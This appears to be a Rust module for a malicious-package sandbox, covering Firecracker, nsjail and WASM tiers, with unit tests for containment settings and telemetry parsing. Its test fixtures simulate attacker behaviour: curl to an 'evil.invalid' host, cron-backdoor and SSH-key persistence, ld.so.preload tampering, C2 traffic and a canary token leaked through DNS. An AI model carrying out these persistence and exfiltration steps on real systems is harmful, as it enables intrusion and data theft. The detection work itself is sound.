//! 3-Tier Kernel Execution & Sandbox Architecture (`VNA-14` – `VNA-17`).
//!
//! - Tier 1: Firecracker microVM + `jailer` + in-guest eBPF CO-RE + host DNS/TLS sinkhole
//! - Tier 2: Hardened `nsjail` + SHA-256 digest-pinned Alpine rootfs + required seccomp
//! - Tier 3: Standalone WASM/WASI only (`wasmtime >= 40` with bounded stdio & epoch/fuel)

pub mod canary;
pub mod firecracker;
pub mod nsjail;
pub mod schema;

pub use canary::{CanaryProfile, CanarySecret};
pub use firecracker::{
    build_jailer_args, build_vm_config, detect_firecracker_ready, inspect_sinkhole_egress,
    parse_dns_query_name, parse_tls_client_hello_sni, parse_vsock_ebpf_stream,
    run_firecracker_sandbox, FirecrackerConfig, FirecrackerOutcome, FirecrackerVmConfig,
    VsockTelemetryFrame,
};
pub use nsjail::{
    build_nsjail_args, compute_directory_tree_sha256, detect_nsjail_ready, nsjail_install_command,
    parse_nsjail_telemetry, resolve_rootfs_strict, run_nsjail_sandbox_strict,
    write_rootfs_digest_manifest, NsjailInvocation, NsjailOutcome, RootfsDigestEntry,
    RootfsDigestManifest, VerifiedRootfs, ROOTFS_DIGEST_MANIFEST_FILENAME,
};
pub use schema::{
    normalize_telemetry, normalize_volatile_text, CanaryChannel, CanaryEncoding,
    CanaryExfiltration, CanonicalNetworkEvent, CanonicalProcessNode, ExecutionTier,
    KernelBehaviorGraphV1, KernelEscapeEvent, KernelViolation, KernelViolationCode, MemoryAnomaly,
    RawKernelEvent, TriggerSpecV1, KERNEL_GRAPH_SCHEMA_VERSION, TRIGGER_SPEC_SCHEMA_VERSION,
};

#[cfg(test)]
mod tests {
    use super::*;
    use common::{PackageId, PackageManifest};
    use std::collections::HashSet;
    use std::path::Path;

    fn sample_dns_query(domain: &str) -> Vec<u8> {
        let mut pkt = vec![
            0x12, 0x34, // Transaction ID
            0x01, 0x00, // Standard query
            0x00, 0x01, // QDCOUNT = 1
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        for label in domain.split('.') {
            pkt.push(label.len() as u8);
            pkt.extend_from_slice(label.as_bytes());
        }
        pkt.push(0x00); // root label
        pkt.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // QTYPE A, QCLASS IN
        pkt
    }

    fn sample_tls_client_hello(sni: &str) -> Vec<u8> {
        let sni_bytes = sni.as_bytes();
        let mut sni_ext = Vec::new();
        let entry_len = 1 + 2 + sni_bytes.len();
        sni_ext.extend_from_slice(&((entry_len as u16).to_be_bytes()));
        sni_ext.push(0x00); // host_name type
        sni_ext.extend_from_slice(&((sni_bytes.len() as u16).to_be_bytes()));
        sni_ext.extend_from_slice(sni_bytes);

        let mut ext_block = Vec::new();
        ext_block.extend_from_slice(&0x0000u16.to_be_bytes()); // server_name ext
        ext_block.extend_from_slice(&((sni_ext.len() as u16).to_be_bytes()));
        ext_block.extend_from_slice(&sni_ext);

        let mut client_hello = Vec::new();
        client_hello.extend_from_slice(&[0x03, 0x03]); // TLS 1.2 legacy version
        client_hello.extend_from_slice(&[0xAA; 32]); // Random
        client_hello.push(0x00); // session_id_len
        client_hello.extend_from_slice(&[0x00, 0x02, 0x13, 0x01]); // cipher_suites
        client_hello.extend_from_slice(&[0x01, 0x00]); // compression methods
        client_hello.extend_from_slice(&((ext_block.len() as u16).to_be_bytes()));
        client_hello.extend_from_slice(&ext_block);

        let hs_len = client_hello.len();
        let mut hs = vec![
            0x01,
            ((hs_len >> 16) & 0xff) as u8,
            ((hs_len >> 8) & 0xff) as u8,
            (hs_len & 0xff) as u8,
        ];
        hs.extend_from_slice(&client_hello);

        let mut record = vec![0x16, 0x03, 0x01];
        record.extend_from_slice(&((hs.len() as u16).to_be_bytes()));
        record.extend_from_slice(&hs);
        record
    }

    #[test]
    fn firecracker_vm_and_jailer_configs_enforce_containment() {
        let fc = FirecrackerConfig::from_env();
        let vm = build_vm_config(
            &fc,
            Path::new("/var/lib/creg/rootfs.ext4"),
            Path::new("/tmp/creg-sandbox-1/package.tar.gz"),
            Path::new("/tmp/creg-sandbox-1/scratch.ext4"),
            "creg-tap-0",
            Path::new("/tmp/creg-sandbox-1/vsock.sock"),
        );
        assert_eq!(vm.machine_config.vcpu_count, 1);
        assert!(!vm.machine_config.smt);
        assert_eq!(vm.drives.len(), 3);
        assert!(vm.drives[0].is_root_device && vm.drives[0].is_read_only);
        assert!(vm.drives[1].is_read_only);
        assert!(!vm.drives[2].is_read_only);
        assert_eq!(vm.vsock.guest_cid, 3);

        let args = build_jailer_args(&fc, "fc-01", Path::new("/tmp/vm-config.json"));
        assert!(args.windows(2).any(|w| w == ["--cgroup-version", "2"]));
        assert!(args.windows(2).any(|w| w == ["--cgroup", "pids.max=64"]));
        assert!(args.windows(2).any(|w| w == ["--seccomp-level", "2"]));
        assert!(args.contains(&"--no-api".to_string()));
    }

    #[test]
    fn vsock_ebpf_all_six_hooks_normalize_to_violations() {
        let jsonl = concat!(
            r#"{"hook":"exec","executable":"/usr/bin/curl","argv":["curl","https://evil.invalid"],"parent":"/bin/sh"}"#,
            "\n",
            r#"{"hook":"open_write","path":"/etc/cron.d/backdoor"}"#,
            "\n",
            r#"{"hook":"network","protocol":"tcp","destination":"198.51.100.99","port":443,"sni":"C2.EVIL.INVALID."}"#,
            "\n",
            r#"{"hook":"memfd_create","name":"payload"}"#,
            "\n",
            r#"{"hook":"memory_rwx","kind":"mprotect_rwx","detail":"addr=0x7fff12345678 pid=4219"}"#,
            "\n",
            r#"{"hook":"kernel_escape","syscall":"ptrace","detail":"PTRACE_ATTACH pid=1"}"#,
            "\n",
            r#"{"hook":"kernel_escape","syscall":"io_uring_setup","detail":"entries=64"}"#,
            "\n",
            r#"{"events":[],"overlay_added":["/root/.ssh/authorized_keys"],"overlay_modified":["/etc/ld.so.preload"],"guest_exit_code":0}"#,
            "\n"
        );
        let frame = parse_vsock_ebpf_stream(jsonl.as_bytes());
        assert_eq!(frame.events.len(), 7);
        assert_eq!(frame.overlay_added, vec!["/root/.ssh/authorized_keys"]);
        assert_eq!(frame.overlay_modified, vec!["/etc/ld.so.preload"]);

        let graph = normalize_telemetry(
            ExecutionTier::Tier1Firecracker,
            &TriggerSpecV1::default(),
            &PackageManifest::default(),
            &HashSet::new(),
            &frame.events,
            &frame.overlay_added,
            &frame.overlay_modified,
            &[],
        );

        let codes: HashSet<_> = graph.violations.iter().map(|v| v.code).collect();
        assert!(codes.contains(&KernelViolationCode::KbProcUndeclared));
        assert!(codes.contains(&KernelViolationCode::KbFsPersist));
        assert!(codes.contains(&KernelViolationCode::KbNetUndeclared));
        assert!(codes.contains(&KernelViolationCode::KbMemfdExec));
        assert!(codes.contains(&KernelViolationCode::KbPtraceEscape));
        assert!(codes.contains(&KernelViolationCode::KbIouringEvasion));
    }

    #[test]
    fn sinkhole_dns_sni_parsers_and_canary_scan() {
        let profile = CanaryProfile::for_run(b"fixed-seed-for-unit-test");
        let leaked_token = profile.secrets[1].token.clone();

        let dns_host = format!("{}.EXFIL.Example.COM", leaked_token);
        let dns_pkt = sample_dns_query(&dns_host);
        assert_eq!(
            parse_dns_query_name(&dns_pkt).as_deref(),
            Some(dns_host.to_ascii_lowercase().as_str())
        );
        assert_eq!(parse_dns_query_name(&dns_pkt[..8]), None);

        let tls_rec = sample_tls_client_hello("Stealth.Evil.Invalid.");
        assert_eq!(
            parse_tls_client_hello_sni(&tls_rec).as_deref(),
            Some("stealth.evil.invalid")
        );
        assert_eq!(
            parse_tls_client_hello_sni(&[0x17, 0x03, 0x03, 0x00, 0x05]),
            None
        );

        let (events, leaks) = inspect_sinkhole_egress(
            &profile,
            &[
                ("198.51.100.7", 53, &dns_pkt),
                ("198.51.100.8", 443, &tls_rec),
            ],
        );
        assert_eq!(events.len(), 2);
        assert!(
            leaks.iter().any(|l| l.channel == CanaryChannel::DnsQuery),
            "must detect canary embedded inside DNS query name"
        );
    }

    #[test]
    fn nsjail_builder_enforces_seccomp_rootfs_bindmount_and_no_dev_null() {
        let dir = tempfile::tempdir().unwrap();
        let seccomp = dir.path().join("nsjail-seccomp.cfg");
        std::fs::write(&seccomp, "name: \"creg\"").unwrap();

        let rootfs_base = dir.path().join("rootfs");
        let npm_dir = rootfs_base.join("npm").join("bin");
        std::fs::create_dir_all(&npm_dir).unwrap();
        std::fs::write(npm_dir.join("node"), b"stub-node").unwrap();
        write_rootfs_digest_manifest(&rootfs_base, &["npm"]).unwrap();

        let tarball = dir.path().join("secret-host-dir-tarball.tgz");
        std::fs::write(&tarball, b"dummy").unwrap();
        let decoy = dir.path().join("decoy");
        std::fs::create_dir_all(&decoy).unwrap();

        let pkg = PackageId::new("npm", "demo", "1.0.0");
        let canary = CanaryProfile::for_run(b"unit");
        let trigger = TriggerSpecV1::default();

        // Missing seccomp fails closed
        let err = build_nsjail_args(
            &pkg,
            &tarball,
            &decoy,
            Some(&dir.path().join("missing.cfg")),
            Some(&rootfs_base),
            512,
            60,
            &canary,
            &trigger,
        )
        .unwrap_err();
        assert!(err.to_string().contains("seccomp"));

        // Valid invocation uses /pkg/package.tar.gz:ro, --cgroup_pids_max 64, and no >/dev/null
        let inv = build_nsjail_args(
            &pkg,
            &tarball,
            &decoy,
            Some(&seccomp),
            Some(&rootfs_base),
            512,
            60,
            &canary,
            &trigger,
        )
        .unwrap();
        let joined = inv.args.join(" ");
        assert!(joined.contains(":/pkg/package.tar.gz"));
        assert!(inv
            .args
            .windows(2)
            .any(|w| w == ["--cgroup_pids_max", "64"]));
        assert!(inv
            .args
            .windows(2)
            .any(|w| w == ["--config", seccomp.to_str().unwrap()]));
        assert!(!joined.contains(">/dev/null"));
        assert!(joined.contains("/pkg/package.tar.gz"));
        assert!(!joined.contains("mount /mnt/mount_point") && !joined.is_empty());

        // Ensure libbpf filename telemetry doesn't trigger false-positive bpf escape event
        let logs = b"[SECCOMP] openat(AT_FDCWD, \"/usr/lib/libbpf.so.1\", O_RDONLY) = 3\n";
        assert!(parse_nsjail_telemetry(logs).is_empty());
        let real_esc = b"[SECCOMP] bpf(BPF_PROG_LOAD, ...) = -1 EPERM\n";
        assert_eq!(parse_nsjail_telemetry(real_esc).len(), 1);
    }
}
